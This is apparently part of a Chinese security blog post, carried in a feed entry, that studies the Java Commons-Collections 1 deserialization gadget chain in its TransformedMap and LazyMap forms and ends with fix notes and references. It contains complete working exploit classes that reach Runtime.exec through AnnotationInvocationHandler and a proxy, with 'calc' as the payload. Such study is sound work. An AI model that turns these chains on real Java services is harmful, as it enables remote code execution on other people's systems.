class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(<span class="string">&quot;key&quot;</span>,<span class="string">&quot;value&quot;</span>);</span><br><span class="line">        Map&lt;Object, Object&gt; transformedMap = TransformedMap.decorate(hashMap, <span class="literal">null</span>, chainedTransformer);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">aihConstructor</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        aihConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> aihConstructor.newInstance(Override.class, transformedMap);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 序列化反序列化  </span></span><br><span class="line">        serialize(o);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException&#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>但是运行并没有弹出计算器，因为并没有调用<code>transformer</code></p><p>我们在<code>AnnotationInvocationHandler</code>类的两个if打断点看看</p><p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408302329558.png" alt="QQ_1724168686951"></p><p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408302329427.png" alt="QQ_1724168709732"></p><p>可以看到Exp跳过了第二个if，没有调用<code>setValue</code>方法</p><h3 id="进入setValue方法"><a href="#进入setValue方法" class="headerlink" title="进入setValue方法"></a>进入setValue方法</h3><p>要调用setValue方法，必须满足两个if条件</p><p>第一个if语句<code>if (memberType != null)</code>，跳出来的原因是我们传入的memberType为null，</p><p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408302329380.png" alt="QQ_1724207333660"></p><p>我们的传参语句</p><p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408302329302.png" alt="QQ_1724207473339"></p><p>我们的要求是，传入的注解参数是有成员变量的</p><p>并且满足<code>hashMap.put(&quot;para1&quot;,&quot;para2&quot;)</code>中的<code>para1</code>与成员变量相对应，当然这是第二个if的事了</p><p>跟进Override看看</p><p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408302329256.png" alt="QQ_1724207957694"></p><p>什么都没有，那我们就需要找另外的注解</p><p>我们用<code>Target.class</code>尝试一下，点击<code>Target</code>，其中有一个成员变量<code>value</code>，所以这里的<code>hashmap.put</code>也需要修改为<code>value</code></p><p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408302329279.png" alt="QQ_1724208750403"></p><p>再次debug，成功进入<code>setValue</code>方法</p><p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408302329790.png" alt="QQ_1724208871994"></p><p>但是仍然弹不了计算器，因为<code>setValue</code>的值不可控，指定为<code>AnnotationTypeMismatchExceptionProxy</code>类，无法命令执行</p><p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408302329942.png" alt="QQ_1724208977723"></p><p>我们需要找到一个类，可控<code>setValue</code>的参数</p><h3 id="编写最终Exp"><a href="#编写最终Exp" class="headerlink" title="编写最终Exp"></a>编写最终Exp</h3><p>这里找了一个能够解决<code>setValue</code>可控参数的类-<code>ConstantTransformer</code></p><p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408302329096.png" alt="QQ_1724211692795"></p><ul><li>构造方法：传入的任何对象都放在<code>iConstant</code>中</li><li><code>transform()</code>方法：无论传入什么，都返回<code>iConstant</code></li></ul><p>那我们就可以将<code>AnnotationTypeMismatchExceptionProxy</code>类作为<code>transform</code>方法的参数传入，然后再通过构造方法传入<code>Runtime.class</code>，这样无论<code>transform</code>方法调用什么对象，都会返回<code>Runtime.class</code></p><p>我们来传入Runtime.class调试一下看看：</p><p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408302329885.png" alt="QQ_1724221053295"></p><p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408302329726.png" alt="QQ_1724221129619"></p><p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408302329744.png" alt="QQ_1724221197402"></p><p>可以看到虽然给<code>transform</code>方法传入的参数是<code>AnnotationTypeMismatchExceptionProxy</code>，但是最终返回的是<code>Runtime.class</code></p><p>最终Exp</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ExpFinal</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class), <span class="comment">// 构造 setValue 的可控参数</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span></span><br><span class="line">                        , <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;p0l1st&quot;</span>);</span><br><span class="line">        Map&lt;Object, Object&gt; transformedMap = TransformedMap.decorate(hashMap, <span class="literal">null</span>, chainedTransformer);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">aihConstructor</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        aihConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> aihConstructor.newInstance(Target.class, transformedMap);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 序列化反序列化</span></span><br><span class="line">        serialize(o);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException&#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div><p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408302329048.png" alt="QQ_1724212166724"></p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p><strong>利用链</strong></p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">利用链：</span><br><span class="line">InvokerTransformer#transform</span><br><span class="line">TransformedMap#checkSetValue</span><br><span class="line">AbstractInputCheckedMapDecorator#setValue</span><br><span class="line">AnnotationInvocationHandler#readObject</span><br><span class="line">工具类辅助利用链：</span><br><span class="line">ChainedTransformer</span><br><span class="line">ConstantTransformer</span><br><span class="line">HashMap</span><br></pre></td></tr></table></figure></div><p><strong>流程图</strong></p><p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408302329533.png" alt="QQ_1724226578803"></p><h1 id="LazyMap版CC1攻击链"><a href="#LazyMap版CC1攻击链" class="headerlink" title="LazyMap版CC1攻击链"></a>LazyMap版CC1攻击链</h1><h2 id="寻找链尾的exec方法"><a href="#寻找链尾的exec方法" class="headerlink" title="寻找链尾的exec方法"></a>寻找链尾的exec方法</h2><p>链子的尾部还是<code>InvokerTransformer</code>下的<code>transform</code>方法，继续find usages</p><p>这里选择<code>LazyMap</code>类的<code>get</code>方法，该方法调用了<code>transform</code>方法并且作用域为<code>public</code></p><p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408302329191.png" alt="QQ_1724383565912"></p><p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408302329395.png" alt="QQ_1724383750465"></p><h2 id="寻找链子"><a href="#寻找链子" class="headerlink" title="寻找链子"></a>寻找链子</h2><p>先来看看上图158行中的<code>factory</code>是什么</p><p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408302329552.png" alt="QQ_1724384351607"></p><p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408302329929.png" alt="QQ_1724384611841"></p><p>这里也有<code>decorate</code>方法，作用和<code>TransformMap</code>中的<code>decorate</code>方法一样，那我们就可以通过<code>decorate</code>方法来创建<code>LazyMap</code>对象进而控制<code>factory</code></p><p>构造Exp来看看</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LazyExp1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Runtime</span> <span class="variable">runtime</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);</span><br><span class="line">        HashMap &lt;Object,Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">decorateMap</span> <span class="operator">=</span> LazyMap.decorate(hashMap,invokerTransformer);</span><br><span class="line">        decorateMap.get(runtime);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408302329046.png" alt="image-20240823211214353"></p><p>可以看到这条链是可以利用的，继续往前，最终要找到入口类的<code>readObject</code>方法</p><p>上面我们找到了<code>LazyMap</code>类的<code>get</code>方法，继续看看谁调用了<code>LazyMap.get()</code></p><p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408302329474.png" alt="image-20240823205916331"></p><p><code>AnnotationInvocationHandler</code>类的<code>invoke</code>方法调用了<code>get</code>方法</p><p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408302329784.png" alt="image-20240823210147732"></p><p>分析上条链子时我们知道<code>memberValues</code>可控，并且这个类存在<code>readObject</code>方法，那我们就可以将其作为入口类</p><h2 id="编写Exp"><a href="#编写Exp" class="headerlink" title="编写Exp"></a>编写Exp</h2><p>触发<code>invoke</code>方法，需要动态代理，一个类被动态代理之后，通过代理调用这个类的方法，就一定会调用<code>invoke</code>方法</p><p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408302329586.png" alt="image-20240823211902162"></p><p>这里调用了<code>entrySet</code>方法，也就是说，如果我们将<code>memberValues</code>的值改为代理对象，当调用代理对象的方法，就会跳到执行<code>invoke</code>方法</p><p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408302329510.png" alt="image-20240823213000546"></p><p><code>AnnotationInvocationHandler</code>中实现了<code>InvocationHandler</code>，可以使用动态代理</p><p>我们将<code>AnnotationInvocationHandler</code>对象用Proxy进行动态代理，那么进行<code>readObject</code>时，只要调用任意方法，就会进入到<code>AnnotationInvocationHandler.invoke</code>方法中，进而触发<code>LazyMap.get</code>方法</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LazyExpFinal</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class), <span class="comment">//构造setValue的可控参数</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">decorateMap</span> <span class="operator">=</span> LazyMap.decorate(hashMap, chainedTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">declaredConstructor</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        declaredConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">invocationHandler</span> <span class="operator">=</span> (InvocationHandler) declaredConstructor.newInstance(Override.class, decorateMap);</span><br><span class="line">        <span class="comment">//设置动态代理</span></span><br><span class="line">        <span class="type">Map</span> <span class="variable">proxyMap</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;, invocationHandler);</span><br><span class="line">        <span class="comment">//触发invoke</span></span><br><span class="line">        invocationHandler = (InvocationHandler) declaredConstructor.newInstance(Override.class, proxyMap);</span><br><span class="line">        serialize(invocationHandler);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408302329561.png" alt="image-20240823220642200"></p><h2 id="小结-1"><a href="#小结-1" class="headerlink" title="小结"></a>小结</h2><p><strong>利用链</strong></p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">利用链：</span><br><span class="line">InvokerTransformer#transform</span><br><span class="line">LazyMap#get</span><br><span class="line">AnnotationInvocationHandler#readObject</span><br><span class="line">工具类辅助利用链：</span><br><span class="line">ChainedTransformer</span><br><span class="line">ConstantTransformer</span><br><span class="line">HashMap</span><br><span class="line">Map(Proxy)#entrySet</span><br></pre></td></tr></table></figure></div><p><strong>流程图</strong></p><p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408302329295.png" alt="image-20240823222404367"></p><h1 id="修复方法"><a href="#修复方法" class="headerlink" title="修复方法"></a>修复方法</h1><p>官方推荐的修复方法是将jdk版本提升至jdk8u71</p><h2 id="TransformMap"><a href="#TransformMap" class="headerlink" title="TransformMap"></a>TransformMap</h2><p>jdk8u71及后续版本没有能调用<code>readObject</code>中<code>setValue</code>方法的地方</p><h2 id="LazyMap"><a href="#LazyMap" class="headerlink" title="LazyMap"></a>LazyMap</h2><p>jdk8u67之后的版本序列化不再通过<code>defaultReadObject</code>方式，而是通过<code>readFields</code>来获取几个特定的属性，<code>defaultReadObject</code>可以恢复对象本身的属性，比如<code>this.memberValues</code>就能恢复成我们原本设计的恶意类，但是通过<code>readFields</code>方式，<code>this.memberValues</code>为null，后面执行<code>get</code>方法就没办法触发，这也就是高版本不能使用的原因</p><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a class="link" href="https://drun1baby.top/2022/06/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8701-CC1%E9%93%BE/">Java反序列化Commons-Collections篇01-CC1链 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p><a class="link" href="https://blog.nbcares.top/archives/CC1">Java_Commons-Collections 1 (CC1) 学习过程 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p><a class="link" href="https://gtl-ju.github.io/2023/07/18/CommonCollections1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/">CommonCollections1利用链分析 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>]]></content>
    
    
    <summary type="html">false</summary>
    
    
    
    
    <category term="Java安全" scheme="http://example.com/tags/Java%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
</feed>
